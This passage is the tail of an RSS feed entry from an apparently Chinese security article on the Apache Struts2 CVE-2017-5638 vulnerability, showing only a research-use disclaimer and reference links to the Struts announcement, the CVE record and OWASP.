&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;: 本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;参考资源&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://struts.apache.org/announce.html#a20170307&#34;&gt;Apache Struts2官方安全公告&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638&#34;&gt;CVE-2017-5638详细信息&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://owasp.org/www-project-top-ten/&#34;&gt;OWASP Struts2安全指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
    </channel>
</rss>
